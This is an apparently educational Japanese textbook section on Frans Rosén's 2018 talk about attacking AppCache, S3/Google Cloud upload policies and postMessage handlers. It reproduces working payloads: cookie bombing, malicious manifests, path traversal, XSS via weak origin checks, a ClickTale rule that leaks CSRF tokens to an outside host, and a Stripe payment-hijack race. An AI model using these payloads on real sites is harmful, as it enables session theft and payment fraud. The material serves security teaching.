# 「みんなが使っている機能」を攻める — Frans Rosénの実戦ケーススタディ（AppCache / アップロードポリシー / postMessage）

> **この節で分かること**
> - なぜ「最新技術」ではなく「広く実運用されている機能」がバグバウンティの狙い目になるのか、その発想を説明できる
> - AppCache（アプリケーションキャッシュ）を悪用してオリジン全体を攻撃者のHTMLに差し替える「全ブラウザ共通のバグ」の仕組みを説明できる
> - AWS S3・Google Cloud の署名付きアップロードポリシーの弱い実装（`starts-with` の空指定、パストラバーサル、正規表現バイパス）を自分で見分けられる
> - postMessageの弱いオリジン判定（正規表現・`indexOf`・`.replace` のバグ）とクライアントサイドレースコンディションによる攻撃の型を説明できる
> - postMessage-tracker などのツールでリスナーを探す手順と、実際のハンティングでの「つまずき」を知る

**元資料**: https://speakerdeck.com/fransrosen/owasp-appseceu-2018-attacking-modern-web-technologies （原典PDF 142ページ取得済み） / https://www.youtube.com/watch?v=vRqcUS4CPFs （動画は取得できず、スライドと二次情報ベース）
**関連する節**: postMessage の基礎とオリジン検証、クラウドストレージ設定ミス、Service Worker

---

## 1. この節の位置づけ — "Modern = stuff people use"

### なぜこのトークを教材にするのか

Frans Rosén（フランス・ロセーン、@fransrosen）は Detectify のセキュリティアドバイザーで、"The Swedish Ninja"（スウェーデンの忍者）と呼ばれる HackerOne 全期間リーダーボード7位のハンターである。本節が題材とするのは、彼が **OWASP AppSec Europe 2018（ロンドン）** と **NDC Oslo 2018** で行った同一のトーク「Attacking (Modern) Web Technologies」だ。

このトークが教材として優れているのは、実際のバグバウンティで数千〜1万5千ドルの報奨を得た**実事例だけ**で構成されているからである。読者はここで、脆弱性の「型」を暗記するのではなく、Rosénが「どこに目をつけ、どう検証し、どう連鎖させたか」という思考の順序を追う。

### タイトルに込められた皮肉

スライド1のタイトルは「Attacking Modern Web Technologies」だが、スライド2でわざわざ「Attacking **"Modern"** Web Technologies」と引用符付きに訂正される。そしてスライド3のジョークタイトルがテーマを言い切る。

```text
Modern = stuff people use
（"モダン"＝みんなが使っているもの）
```

つまり狙うのは最先端の実験的技術ではなく、**広く実運用されている枯れた機能**である。AppCache のように「古くて誰も気にしていない」機能ほど、実装のばらつきと油断が残る。これがバグバウンティの発想の核心だ。

### トークの全体構成（Rundown）

スライド6-7で示された構成は次の3系統＋ツール共有である（逐語）。

```text
AppCache
- Bug in all browsers

Upload Policies
- Weak Implementations
- Bypassing business logic

Deep dive in postMessage implementations
- The postMessage-tracker extension
- Abusing sandboxed domains
- Leaks, extraction, client-side race conditions

Tool share!
```

> **範囲についての重要な注意**：本トークの実題材はこの3系統だけである。当時会場で聴いた第三者のツイート（複数の独立アーカイブで一致）も、論点を「S3 / AppCache（全ブラウザ）/ postMessage exploitation / client-side race conditions」と要約しており、内容と一致する。Zendesk、プロトタイプ汚染（prototype pollution）、client-side storage といった題材は**このトークには存在しない**ので本節では扱わない。データ抽出事例で登場するサードパーティJSは **ClickTale**（現 Contentsquare）であって Zendesk ではない。

> ### 📌 ここは自分で開いて読んでください
> **資料**: Attacking (Modern) Web Technologies（NDC Oslo 2018、54分58秒） — https://www.youtube.com/watch?v=vRqcUS4CPFs
> **なぜ**: 本教科書の執筆環境からは自動取得できなかった（理由: YouTube がegressプロキシで全面ブロック。字幕API・アーカイブ・テキスト抽出プロキシもすべて403）。以下の記述は142枚のスライドPDFと二次情報にもとづく要約である。動画の内容はスライドの音声解説にあたる。
> **読みどころ**:
> 1. postMessageバグの**発見ワークフローの実演**（DevToolsのEvent Listenersパネルでリスナーを見つけ、ブレークポイントで受信関数までトレースし、コンソールから任意メッセージを再送する一連の手つき）。静的なスライドでは伝わらない「探索の順序」を学ぶ。
> 2. クライアントサイドレースコンディションの直感（なぜ`INIT`ダンス中に`LOAD`を連射すると勝てるのか）。
> 3. Slack事例の語り。**このSlack事例はスライドPDFには1枚も無く、動画でしか聴けない口頭パート**である。
> **代替手段**: 原著者本人のREADMEが挙げる OWASP AppSec Europe 版 https://www.youtube.com/watch?v=oJCCOnF25JU 、およびpostMessage系統の開始位置 https://youtu.be/oJCCOnF25JU?t=1094 （18分14秒）。スライド本文のGitHubミラー https://raw.githubusercontent.com/irsdl/webhacklist/HEAD/archived-references/md/2018/2018-owasp-appsec-europe-attacking-modern-web-technologies-slides.md 。

---

## 2. 第1系統: AppCache — "Not modern!"

### AppCacheとは何か（設計意図）

AppCache（Application Cache, HTML5のオフラインキャッシュ機構）とは、Webページとその関連ファイルをブラウザに丸ごと保存し、オフラインでも表示できるようにする古い仕組みのこと。たとえば地下鉄でネットが切れてもWebアプリが動くように、という目的で作られた。

HTMLは `manifest` 属性でマニフェストファイルを宣言する。

```html
<html manifest="example.appcache">
  ...
</html>
```

マニフェスト本体は `CACHE MANIFEST` で始まるテキストで、キャッシュするURLを列挙する。

```text
CACHE MANIFEST
# v1 - 2011-08-13
# This is a comment.
http://www.example.com/index.html
http://www.example.com/header.png
```

なお、この機能は本トーク当時すでに非推奨方向で、後述のとおり現在は主要ブラウザから完全に削除済みである。後継は Service Worker + Cache API。だからこそタイトルが「Not modern!（モダンじゃない！）」なのだ。

### 独立発見の経緯

スライド9の Disclaimer（免責）によれば、同種のAppCacheトリックは **filedescriptor** が前年のAppSecEUで独立に公表済みである（参照: https://speakerdeck.com/filedescriptor/exploiting-the-unexploitable-with-lesser-known-browser-tricks?slide=22 ）。Rosén側は後述のとおり Mathias Karlsson（@avlidienbrunn）と共同で全ブラウザへ報告した。クレジットの正確さもハンティングの倫理の一部である。

### 攻撃の下ごしらえ: Cookie爆撃で全ページを500にする（どう動くのか）

AppCache乗っ取りの第一歩は「正常なページを壊す」ことだ。マニフェストには `FALLBACK:`（応答が取れなかったときの代替ページ）を書ける。だから**全ページを強制的にエラー化すればFALLBACKが発火する**。

これを実現するのが Cookie爆撃（Cookie Stuffing / Bombing）だ。巨大なCookieを大量に撒くと、リクエストヘッダが肥大化してサーバ（や前段のLB/CDN）が500エラーを返すようになる。スライド13のコード（逐語）。

```html
<script>
<![CDATA[
setTimeout(function(){
for(x=0;x<9999;x++){document.cookie=x+'='+Array(999).join('a')+';path=/'};
}, 1000);
]]></script>
```

9999個 × 各998文字のCookieを設定する。スライドの言葉では「Will make EVERY page return 500 Error = Manifest FALLBACK will be used（全ページを500エラーにさせる＝マニフェストのFALLBACKが使われる）」。攻撃者が被害者ブラウザに任意のCookieを撒ければ、被害者のそのサイトへのアクセスを全面的にエラー化できる、というのが要点だ。

### 攻撃の核心: FALLBACKのパス逸脱バグ（全ブラウザ共通）

マニフェストを深いパス `/u/2241902/manifest.txt` に置く。すると本来はそのディレクトリ配下しか対象にできないはずのFALLBACKが、**ルート（サイト全体）を含む「すべて」に適用されてしまう**。スライド14のマニフェスト（逐語）。

```text
CACHE MANIFEST

FALLBACK:
/ /u/2241902/manifest/report.xml

NETWORK:
http://*
https://*
*
```

`FALLBACK:` の行は「左＝名前空間（対象URL範囲）」「右＝フォールバック先」だ。ここでは左が `/`（ルート＝サイト全体）、右が攻撃者が用意したページ。本来マニフェストと同じパス配下しか名前空間に指定できないはずが、ブラウザ実装は**右側（フォールバック先URL）のパスしか見ておらず、名前空間側の `/` を許してしまった**。

### なぜ全ブラウザが間違えたのか（仕様の曖昧さ）

W3C仕様（ https://www.w3.org/TR/2015/WD-html51-20150506/browsers.html#concept-appcache-manifest-fallback ）にはこう書かれていた。

> "To mitigate this, manifests can only specify fallbacks that are in the same path as the manifest itself."

Rosénの解説（スライド16、逐語）によれば、この文は紛らわしく「"フォールバックURLのパス"の意味とも取れ、ブラウザはそう解釈していた」。だが仕様にはもう一文あり、ブラウザはそれを見落としていた。

> **Fallback namespaces** must also be in the same path as the manifest's URL.
> （フォールバック名前空間もまた、マニフェストのURLと同じパスになければならない）

つまり仕様は「フォールバック先URL」と「フォールバック名前空間」の**両方**を同一パス制約下に置いていたのに、多くのブラウザが名前空間側の制約を実装し忘れていた。**仕様の曖昧な一文が、全ブラウザ共通のバグを生んだ**わけだ。ここは「仕様のあいまいさ＝バグの温床」という教訓として重い。

### 実事例: Dropbox($12,845 + $3,000)

Rosénはこれを Dropbox で成立させた（スライド17-23、逐語の攻撃連鎖）。

- `dl.dropboxusercontent.com` 上でXMLをHTMLとして実行できた
- そのXMLがブラウザにルート直下でマニフェストをインストールする
- 以降 Dropbox からダウンロードされる任意のファイルがフォールバックのXML-HTMLページを使うようになり、現在のURLを外部ログ収集サイトへ送信する
- 結果、**すべての秘密リンクが攻撃者へ漏洩する**

報奨は **$12,845**。さらに全ブラウザへの共同報告（coordinated disclosure）でブラウザ側の報奨 **$3,000** を得た。

Dropbox側の対策（スライド21-23、逐語）は次のとおり。防御の実例として価値が高い。

| 対策（原文） | 意味 |
| --- | --- |
| No more XML-HTML on dl.dropboxusercontent.com | ユーザーコンテンツでHTMLを実行させない |
| No more public directory for Dropbox users | 全ユーザー共通の公開ディレクトリを廃止 |
| Coordinated bug reporting to every browser | 全ブラウザへ協調報告 |
| No more FALLBACK on root from path file | パス配下ファイルからのルートFALLBACKを禁止 |
| Argumented for faster deprecation of AppCache | AppCacheの早期廃止を主張 |
| Random subdomains for user-files | ユーザーファイルをランダムなサブドメインに分離 |

ブラウザ対応は Chrome / Edge・IE / Firefox / Safari すべて **Fixed**。タイムラインは「Reported 28 Feb 2017, fixed ~June 2017」。Chromiumバグは https://bugs.chromium.org/p/chromium/issues/detail?id=696806#c40 。

> 〔補足〕このブラウザバグは、Rosén 本人のツイート（複数の第三者アーカイブで一致）によれば **Mathias Karlsson（@avlidienbrunn、Detectify共同創業者）との共同報告**だった。教科書的にクレジットするなら「filedescriptor が独立発見 / Rosén ＋ Mathias Karlsson が全ブラウザへ共同報告（Chromiumバグ696806、報奨$3,000）」が正確。引用元は第三者のGitHub公開ツイートデータセットであり、Twitter本体では原文確認していない。

### 今も攻撃が成立する条件、そしてService Worker

スライド24-25は「どんな条件が揃えば今もこの種の攻撃が成立するか」を整理する（逐語）。

```text
AppCache vulns still possible（要件）
- HTTPS only (was changed recently)
- Files uploaded can run HTML
- Files could be on a isolated sandboxed domain
- Files are uploaded to the same directory for all users
```

```text
ServiceWorkers, big brother of AppCache（AppCacheの兄貴分）
- HTTPS only
- Files uploaded can run HTML
- Files could be on a isolated sandboxed domain
- Files are uploaded to the root path
  For example: bucket123.s3.amazonaws.com/test.html
```

要点は4条件だ。①HTTPS必須 ②アップロードしたファイルがHTMLとして実行される ③（分離）サンドボックスドメイン上に置ける ④全ユーザー共通のディレクトリ、または（Service Workerなら）ルート直下に置ける。

Service Worker（サービスワーカー）とは、ページとは別にバックグラウンドで動き、そのオリジンへの通信を横取り（インターセプト）できるスクリプトのこと。登録スクリプトのパスがスコープ（効く範囲）の上限になる。だから攻撃者がオリジンのルート `/` に `.js` を置いて登録できれば、そのオリジン配下の全ナビゲーションを乗っ取れる。「AppCacheの強化版」というわけだ。

そして「ルート直下にHTMLやJSを置けるか」という一点が、次章のアップロードポリシー攻撃と直結する。スライド32はまさに「We can place stuff in root, remember ServiceWorkers/AppCache?」と繋いでいる。

> 〔補足〕スライド24の「was changed recently（最近変わった）」は、Mozilla の2018年2月12日付「Restricting AppCache to Secure Contexts」（AppCacheをHTTPS限定にする措置）を指す。2018年7月のトークから見て「recently」であり時期が整合する。出典: https://blog.mozilla.org/security/2018/02/12/restricting-appcache-secure-contexts/ 。

### AppCacheのその後（歴史的な締め）

Rosénが「AppCacheの早期廃止を主張した」流れは、実際のブラウザの廃止プロセスに結実した。3年後の研究者 Luan Herrera（@lbherrera）「AppCache's forgotten tales」（2021-05-31）が、その最終局面を埋めている。

廃止タイムライン（Herrera記事より）: Chrome 67 で deprecate → Chrome 70 で非セキュアコンテキストから削除 → Chrome 85 でデフォルト削除（当初82予定を延期）→ **Chrome 93 で完全削除**。2018-2019年の間にChromeのAppCache実装には400以上の変更（CL）が投じられ、「Web Platformで2番目に厄介なclient-side storage API」と評された。

Herreraの攻撃はRosénと対照的だ。表で整理する。

| 観点 | Rosén 2018（本トーク） | Herrera 2020-2021 |
| --- | --- | --- |
| 悪用セクション | **FALLBACK**（same-origin限定） | **NETWORK**（＋CACHE）でクロスオリジン |
| 前提 | サンドボックスドメインに攻撃者HTMLを置ける | 攻撃者サイトにマニフェストを置くだけ |
| 効果 | オリジン全体の乗っ取り・秘密リンク漏洩（完全性の侵害） | リダイレクトURLの文字単位リーク（機密性の侵害・XS-Leak） |
| 発火装置 | Cookie爆撃で全ページ500化 | `applicationCache`のイベント／`fetch`のreject |
| 結末 | 全ブラウザ修正＋廃止加速を主張 | Chrome 93で完全削除され決着 |

Herreraの核心は「NETWORKセクションを置くと、未列挙URLへのリクエストがブロックされ、しかもそれがリダイレクト先にも適用される」＝**許可リスト（allowlist）として働く**という発見だ。これを使えば「あるURLがリダイレクト連鎖に含まれるか」を1ビットのオラクル（判定装置）として観測でき、Chrome独自の `isPattern` glob と組み合わせてリダイレクト先URL（セッショントークンやCSRFトークンを含む）を1文字ずつブルートフォースできた。報奨は CVE-2020-6399 と CVE-2021-21168 で合計 **$10,000**。

> ### 📌 ここは自分で開いて読んでください
> **資料**: AppCache's forgotten tales（Luan Herrera, 2021-05-31） — https://blog.lbherrera.me/posts/appcache-forgotten-tales/
> **なぜ**: 原URLへは本執筆環境から到達できなかった（サイト側の制限）。以下の記述は irsdl/webhacklist にアーカイブされた全文Markdownにもとづく要約である。
> **読みどころ**:
> 1. NETWORKセクションが「許可リスト」として働き、リダイレクト先にも適用されるという核心。
> 2. `cache: "force-cache"` でローテーションするCSRFトークンを「凍結」して多段リークを成立させるテクニック（クライアントサイドのオラクル攻撃で`cache:`オプションが可用性を左右する、という一般教訓）。
> 3. FALLBACKはsame-origin限定、NETWORKはクロスオリジンで効く、という対比。
> **代替手段**: ミラー https://raw.githubusercontent.com/irsdl/webhacklist/HEAD/archived-references/md/2021/2021-blog-lbherrera-me-appcache-s-forgotten-tales.md 、PoC https://gist.github.com/lbherrera/6e549dcf49334b637c22d76518a90ff6 。

---

## 3. 第2系統: アップロードポリシー — AWS S3 と Google Cloud

### アップロードポリシーとは（設計意図）

アップロードポリシーとは、会社のサーバを経由せず、ブラウザから直接クラウドストレージのバケットへファイルをアップロードさせる仕組みのこと（スライド27）。サーバの負荷を減らせて高速で、署名付きなので一見安全に見える。しかしスライド28いわく **Easy to do wrong!（間違えやすい！）**。

HTTPリクエストの形（スライド29、逐語）。

```http
POST /bucket-name HTTP/1.1
Host: s3.amazonaws.com
Connection: close
Content-Length: 341520
```

### 署名付きポリシーの中身（どう動くのか）

ポリシーは署名済みのbase64エンコードJSONだ（スライド30、逐語）。

```json
{ "expiration": "2018-03-04T15:38:11Z",
  "conditions": [
    {"bucket": "example-uploads"},
    ["starts-with", "$key", "acct_1XAHBapeZ06R42bwNwUt"],
    {"acl": "public-read"},
    {"success_action_redirect": "https://dashboard.example.com/file_upload/complete"},
    ["starts-with", "$Content-Type", ""],
    ["content-length-range", 0, 524288]
  ]
```

`conditions` の各要素がアップロード時に守られる制約だ。`["starts-with","$key","<prefix>"]` は「オブジェクトキー（＝保存パス）が指定プレフィクスで始まること」を要求する。`{"acl":"public-read"}` は公開読み取り、`content-length-range` はサイズ制限。ここが弱いと崩れる。

### AWS S3の落とし穴（攻撃者はどこを突くか）

**落とし穴1: `$key` の `starts-with` が空文字**（スライド31）。

```json
["starts-with", "$key", ""],
```

キーの制約が実質無いので、**バケット内の任意のファイルを差し替えられる**。既存の重要ファイル（JS、設定など）を上書きできてしまう。

**落とし穴2: プレフィクスに `/` が無い**（スライド32）。

```json
["starts-with", "$key", "acct_1XAHBapeZ06R42bwNwUt"],
```

プレフィクスにパス区切り `/` が含まれないので、`acct_1XAH...evil.html` のように**ルート直下（同一プレフィクス階層）へHTMLを置ける**。これが前章の乗っ取り条件④（ルート直下にファイルを置ける）を成立させる。「We can place stuff in root, remember ServiceWorkers/AppCache?」

**落とし穴3: `$Content-Type` が空**（スライド33）。

```json
["starts-with", "$Content-Type", ""],
```

Content-Typeが自由なので `text/html` を指定して実行可能なHTMLを置ける。

**落とし穴4: Content-Typeが制限されていても回避可能**（スライド34）。`starts-with` はプレフィクス一致しか見ないため、`image/jpeg` で始まりさえすればよい。

```json
["starts-with", "$Content-Type", "image/jpeg"],
```
```text
Content-type: image/jpegz;text/html
```

`image/jpegz;text/html` のように後ろにHTMLタイプを継ぎ足せば、ブラウザ側のMIMEスニッフィングでHTML実行に持ち込める余地が生まれる。

> **どう守るか**（〔補足〕を含む一般化）: Content-Typeは `starts-with` ではなく完全一致で固定し、`X-Content-Type-Options: nosniff` を付与し、ユーザーアップロード物は別オリジン/sandboxで配信する。キーのプレフィクスには必ずユーザーごとの一意な値＋`/` を含め、ルート直下や共通ディレクトリへの書き込みを不可能にする。

### Google Cloud: 独自ビジネスロジックの欠陥

Google Cloud の署名URL方式では、アプリのAPIに「このファイル名でアップロードしたい」と要求すると署名付きURLが返る（スライド35-36）。

```http
POST/user_uploads/signed_url/HTTP/1.1
Host: example.com
Content-Type: application/json;charset=UTF-8
```
```json
{"file_name":"images/test.png","content_type":"image/png"}
```

問題は、`file_name` を攻撃者が自由指定でき、サーバ側が検証しないこと（スライド37-38）。

- 「We can select what file to override（どのファイルを上書きするか攻撃者が選べる）」
- 「If signed URL allows viewing = read any file（署名URLが閲覧を許すなら任意ファイルを読める）」

他人の請求書を読む例（スライド38）。`file_name` を差し替えるだけだ。

```json
{"file_name":"documents/invoice1.pdf","content_type":"application/pdf"}
```

返ってきた署名URLを `fetch` するだけで請求書が手に入る。合計報奨は **~$15,000**（スライド39）。

### 独自ポリシーロジックの自作はダメ（3つのバイパス）

スライド40「Rolling your own policy logic sucks（独自のポリシーロジックを自作するのは最悪）」。目標は「バケットのルート、または別ファイルに到達すること」（スライド41）。

**バイパスA: パストラバーサル（パス正規化）**（スライド42-43）。「Back to the 90s!（90年代に逆戻り）」。

```sh
curl -sL -H 'Origin: https://projects.example.com' \
'https://freehand.example.com/api/get-image?key=../../../&document=MawuabWyZ' | jq -r '.url'
```

`key=../../../` によりパスが正規化されてバケットルートへ抜け、**全オブジェクトへの読み取りアクセス＋一覧取得**に至る。

**バイパスB: URL抽出正規表現のバイパス**（スライド44-47）。バケット名やパスをURLから正規表現で切り出す実装が甘い。期待される形と実際の結果は違う。

```javascript
// Expected
https://example-bucket.s3.amazonaws.com/dir/file.png
// Result
https://s3.amazonaws.com/example-bucket/dir/file.png?Signature..
```

細工URLを渡すと誤ってバケット名部分を抽出してしまう（スライド45-47）。

```json
{"url":"https://.x./example-beta"}
```

> 〔補足〕S3には virtual-hosted style（`bucket.s3.amazonaws.com/key`）と path style（`s3.amazonaws.com/bucket/key`）の2形式があり、URLからバケット名やキーを正規表現で切り出す実装は、この2形式の差異や不正なホスト部（`.x.`）で容易に破綻する。

**バイパスC: 署名リンク発行APIのビジネスロジック欠陥**（スライド48-52）。

```http
POST /api/s3_file/ HTTP/1.1
Host: secure.example.com

{"id":null,"random_key":"xx11","s3_key":"/","uploader_id":719572,"employee_id":null}
```

`s3_key:"/"` を指定すると、発行される署名リンク `https://secure.example.com/files/xx11` がバケットルートを指し、**全オブジェクトへの読み取りアクセス**（Full read access to every object）に至る。

> 〔補足〕本トークのアップロードポリシー系統の**前段**として「そもそもバケット名をどう見つけるか」がある。Rosénは登壇当日のツイートで「S3の署名エラーメッセージがバケット名を開示する」性質、`/files/`・`/static/` のようなパスがS3へのリバースプロキシになっている構成、バケット名を得てからACLチェックを行う流れ、を共有していた。ただしツイートは途中で切れており「this script」の正体は確認できていないので、スクリプト名や詳細手順は補完しない（出典: 第三者のツイートデータセット）。

---

## 4. 第3系統: postMessageの深掘り

### postMessageとオリジン検証の基礎（前提の最小限の補足）

postMessage（ポストメッセージ）とは、異なるオリジン（ドメイン）のウィンドウ／iframe同士がデータをやり取りするためのブラウザAPIのこと。受信側は `window.addEventListener('message', func)` でメッセージを受け取る。

ここで**最重要の防御は、受信ハンドラで送信元オリジン `event.origin` を厳密に検証すること**だ。以降の事例は、すべて「このオリジン検証を怠った／間違えた」ことに起因する。まさに攻撃者が突く一点である。

### postMessage-tracker拡張の誕生

Rosénはリスナー探索を助けるChrome拡張 postMessage-tracker を作った（スライド55-58）。狙いは3つ（逐語）。

- Catch every listener in all frames.（全フレームの全リスナーを捕捉）
- Find the function receiving the message（メッセージを受け取る関数を特定）
- Log all messages btw all frames（全フレーム間の全メッセージをログ）

### パターンA: 素直なXSS（origin無検証）

最も単純なのは、`e.origin` を一切検証せず受信データを危険なAPIに渡す実装だ（スライド59-63）。

```javascript
function (b){b.data.evalCall&&eval("("+b.data.evalCall+")")}
```

攻撃は任意オリジンから1行。

```javascript
b.postMessage({"evalCall":"alert(document.domain)"}, '*')
```

`data:` スクリプトロードに直結する例も同様だ。

```javascript
if (e.data.JSloadScript) {
if (e.data.JSloadScript.type =="iframe") {
            local_create_element(doc, ['iframe', 'width', '0', 'height', '0', 'src',
e.data.JSloadScript.value], parent);
          } else {
            localLoadScript(e.data.JSloadScript.value)
          }
      }
```
```javascript
b.postMessage({"JSloadScript":{"value":"data:text/javascript,alert(document.domain)"}},'*')
```

### パターンB: 複雑なデータ抽出（ClickTaleのルール機構を悪用）

ここからが本トークの真骨頂だ。ClickTale（行動解析SaaS、現Contentsquare）のリスナー実装を悪用して、被害者のCSRFトークンを盗む。

まず脆弱なオリジン判定（スライド65-66）。

```javascript
var o = new RegExp("(clicktale.com|qa-core.app.clicktale.com)($|:)"),
```

正規表現でドット `.` をエスケープしていないため、`.` が任意の1文字にマッチしてしまう。攻撃者は `qa-core.appxclicktale.com`（`app` の後が `x`）のようなFQDNを用意し、hostsで自分のドメインにマップして判定を通過する（スライド67）。

```sh
sudo su
echo "127.0.0.1 qa-core.appxclicktale.com" >> /etc/hosts
```

判定を抜けると、`CT_testRules` という名前のメッセージで「ルールセット」を送り込め、`sessionStorage` 経由で実行機構に渡る（スライド68）。ルールは triggers（発火条件）/ states（状態条件）/ action（動作）の3部構成だ（スライド69）。

```javascript
function Rule(t) {
    this.name = t.name;
    var e = actionsFactory.construct(t.action, t),
        n = observablesFactory.construct(t.triggers),
        o = statesFactory.construct(t.states);
    n && n.subscribe(function(t) {
        if (o.evaluate()) return e.execute(t)
    })
}
```

核心は action の `dynamicEventName`（動的イベント名）だ。これは「イベント名を実行時にページの中身から組み立てる」機能で、抽出ソースが豊富に用意されている（スライド70-71）。

| `type` 値 | 抽出対象 |
| --- | --- |
| `TextValue` | 指定名のテキスト |
| `ElementValue` | 任意DOM要素の値（`querySelector`指定） |
| `TriggeredElementValue` | トリガした要素の値 |
| `CookieValue` | 任意Cookieの値（`name`指定） |
| `JSVariableValue` | 任意JS変数の値（`name`指定） |
| `QueryStringParamName` | URLクエリパラメータ |
| `BookmarkName` | ブックマーク名 |
| `URLValue` | 現在URL |

抽出した値が「イベント名」としてClickTaleの外部サーバへ送られる。つまり**任意のCookie・DOM・JS変数を外部送出できる**。攻撃者はこう組み立てる（スライド74）。

```javascript
"action": {
"type": "TestRuleEvent",
"dynamicEventName": {
"parts": [
                {"type": "ElementValue","ctSelector": {"querySelector": ".content-wrapper script"}},
                {"type": "CookieValue","name": "csrf_token"}
            ]
        }
```

`.content-wrapper script` の中身と Cookie `csrf_token` をイベント名に連結して送出する。完成ペイロード（スライド75-76）は `setInterval` でメッセージを送り続ける。

```javascript
function doit() {
    found=false;
    clearInterval(inte);
    inte = setInterval(function() {
        if(b && !found) {
            send('{"name":"CT_testRules","params":{"testRules":{"rules":[{"name":"xxx","states":{"type":"JSVariableExists","name":"ClickTaleCookieDomain","value":"example.com"},"triggers":{"type":"Delay","delay":5000},"action":{"type":"TestRuleEvent","dynamicEventName":{"parts":[{"type":"ElementValue","ctSelector":{"querySelector":".content-wrapper script"}},{"type":"CookieValue","name":"csrf_token"}]},"actualType":"CTEventAction"}}]}},"function":"CT_testRules"}')
        } else if(found) {
            send('{}');
        }
    }, 2000);
}
```

スライド76のタイトルは「CSRF-token!」。ここで学ぶべきは、**正規のサードパーティJSでも、その「設定機構」を読み解けば抽出ガジェットに変えられる**という発想だ。コードリーディング主体の攻撃思考である。

### パターンC: サンドボックスドメイン上のXSS（SOPの落とし穴）

「ユーザーコンテンツを分離ドメインに置く」設計は一見安全だが、その分離ドメイン**内での**攻撃者コンテンツ設置を考慮しないと崩れる（スライド77-85）。登場ドメインは `ACME.COM`（本体）と `usersandbox.com`（分離ドメイン）。

```text
1. ACME.COM でドキュメント作成
2. ユーザーコンテンツは分離ドメイン usersandbox.com にある
3. doc-converter用に usersandbox.com のサンドボックスがiframeで開く
4. 攻撃者も同じ usersandbox.com にファイルを置けるため、
   SOP上、攻撃者ページから同オリジンのiframe内JSにアクセスできる
5. iframeが攻撃者ウィンドウへデータを漏らす → ドキュメントデータ入手
```

ここで同一オリジンポリシー（Same-Origin Policy, SOP）とは、あるオリジンのページが別オリジンのページのDOMやスクリプトに勝手にアクセスできないようにするブラウザの基本ルールのこと。分離ドメインは「本体から見て別オリジン」だが、攻撃者が同じ分離ドメインにファイルを置ければ、攻撃者ページとconverter iframeは**同一オリジン**になり、SOPが逆に攻撃者に味方してしまう。

### パターンD: クライアントサイドレースコンディション #1

多言語ウェルカム画面でJSがpostMessage経由でロードされる例（スライド86-102）。脆弱なリスナーのオリジン判定はこうだ。

```javascript
function (a){0>a.origin.indexOf(MpElD)||(a=a.data,"close"!=a&&"continue"!=a&&"cancel"!=a&&(a=JSON.parse(a),callback(a)))}
```

`0>a.origin.indexOf(MpElD)` は「originに特定文字列が含まれていなければ拒否」だけ。`indexOf` は部分一致なので、`link.com.example.com` のようにどこかにその文字列を含めれば通過してしまう（スライド89）。

さらにロードされたJSの `curr` パラメータがエスケープされておらず（スライド92）、文字列連結でJSに注入できる。

```javascript
+ "\x26lang\x3d\x26country\x3d" + a.country + "\x26curr\x3d" + a.curr;
```
```javascript
...&curr=&osl='-alert(1)-'
```

`'-alert(1)-'` でシングルクオートを閉じてJS実行。サイトが `window.alert` を潰していても、新規iframeの `contentWindow.alert`（ネイティブ実装）を親windowに移植すれば復活できる（スライド95、PoC提出時の定番テク）。

```javascript
document.body.appendChild(iframe=document.createElement('iframe'));
window.alert=iframe.contentWindow['alert'];
document.body.removeChild(iframe);
window.alert(document.domain)
```

「1回しか効かない」制約は、**JSロードとiframeロードの間隙**を突いて解決する。攻撃者サイトが被害サイトを開き、`mpel.js` がロードされる隙にpostMessageを10ミリ秒間隔で連射する（スライド98-100）。

```javascript
setInterval(function() {
if(b) b.postMessage('{"sitelist":"...","siteurl":"...","curr":"curr=&osl=\'-(function(){...window.alert(document.domain)})()-\'"}','*')
    }, 10);
```

スライド101「We won!」、スライド102「Client-Side Race Condition — postMessage between JS-load and iframe-load / Worked in all browsers.」。

### パターンE: レースコンディション #2 — Stripe決済乗っ取り

本トークで最も派手な事例だ（スライド103-129）。まず脆弱なオリジン判定コード（スライド104-108）に**2つのバグ**が潜む。

```javascript
SecureCreditCardController.prototype.isValidOrigin = function (origin) {
    var domains = [".example.com", ".example.co.nz", /* ...多数... */];
    var escapedDomains = $.map(domains, function (domain) {
        return domain.replace('.', '\\.');
    });
    var exampleDomainsRE = '^https:\/\/.*(' + escapedDomains.join('|') + ')$';
    return Boolean(origin.match(exampleDomainsRE));
};
```

**1つ目のバグ**（スライド105-106）: `String.prototype.replace` に文字列（正規表現でない）を渡すと**最初の1個しか置換されない**。

```javascript
".example.co.nz".replace('.', '\\.')
// => "\.example.co.nz"   ← 先頭のドットだけエスケープ、残りの . はワイルドカードのまま
```

**2つ目のバグ**（スライド107-111）: 正規表現が `^https:\/\/.*(...)$` と `.*` で始まるため区切りが甘い。加えて `.nz` は2015年からトップレベルで直接登録可能（スライド109）。

```javascript
Boolean("https://www.exampleaco.nz".match('^https:\/\/.*(\.example.co.nz)$'))
// => true
```

攻撃者ドメイン `www.exampleaco.nz`（`example` の前が `a`、`.co.nz` ではなく一続き）が `\.example.co.nz` にマッチしてしまう。つまり攻撃者は `exampleaco.nz` を実際に登録すれば、正規のオリジン判定を突破できる。

続いて決済の「INITダンス」（ハンドシェイク）を見る。加盟店 `ilikefood.com` とPCI認証済み決済ドメイン `foodpayments.com` がpostMessageで信頼を確立する（スライド114-118）。

```javascript
// メイン → iframe
iframe.postMessage('INIT', '*')
// iframe: INITの送信者を msgTarget として登録
if(e.data==INIT && originOK) { msgTarget = event.source; msgTarget.postMessage('INIT','*') }
// メイン: プロバイダ名＋公開鍵を送る
if(INIT) { iframe.postMessage('["LOAD","stripe","pk_abc123"]}', '*') }
// iframe: 決済プロバイダをロードし、リスナーを閉じる
if(e.data[0]==LOAD && originOK) { initpayment(e.data[1], e.data[2]); window.removeEventListener('message', listener) }
```

問題は、**最初のINITハンドシェイクだけで信頼を確立し、後続のLOADメッセージのオリジンやsourceを再検証しない**ことだ。攻撃者は `exampleaco.nz` から `ilikefood.com` を開き（オリジン判定を前述バグで通過）、iframeに `LOAD` を連射する（スライド122）。

```javascript
setInterval(function(){
  child.frames[0].postMessage('["LOAD","stripe","pk_diffkey"]}','*')
}, 100)
```

攻撃者のLOADがレースに勝つと、リスナーが閉じ、Stripeが**攻撃者の公開鍵 `pk_diffkey`** でロードされる（スライド124）。以降、被害者が入力したクレジットカードは「攻撃者のStripeアカウント」でトークン化される。加盟店側では決済失敗に見えるが、Stripe側では成功しており、攻撃者はStripeログからトークンを取り、任意金額を請求できる（スライド128-129）。

```sh
curl https://api.stripe.com/v1/charges \
  -u sk_test_REDACTED_EXAMPLE_KEY: \
  -d amount=999 -d currency=usd \
  -d description="Example charge" \
  -d source=tok_REDACTED_EXAMPLE
```

